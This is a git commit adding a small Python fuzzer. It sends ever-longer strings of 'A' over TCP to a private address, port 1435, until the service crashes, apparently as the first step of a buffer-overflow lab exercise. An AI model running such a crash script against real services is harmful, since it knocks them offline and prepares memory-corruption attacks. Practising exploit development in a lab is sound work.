2e87b3a04b01cf79ce0fc1c0fb4551102d6e280c
Shanavas <57465591+Shan-repo@users.noreply.github.com>
2021-10-19 00:01:43 +1100

    Add files via upload

---
+++ 1Fuzzer.py
@@ -0,0 +1,20 @@
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+buffer = "A" * 100
+
+while True:
+        try:
+                s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+                s.connect(('192.168.132.130',1435))
+                print("Sending: %s" % str(len(buffer)))
+                s.send((buffer + "\x00"))
+                s.close()
+                sleep(4)
+                buffer = buffer + "A" * 100
+
+        except:
+                print("Crushed at %s bytes" % str(len(buffer)))
+                print(buffer)
+                sys.exit()
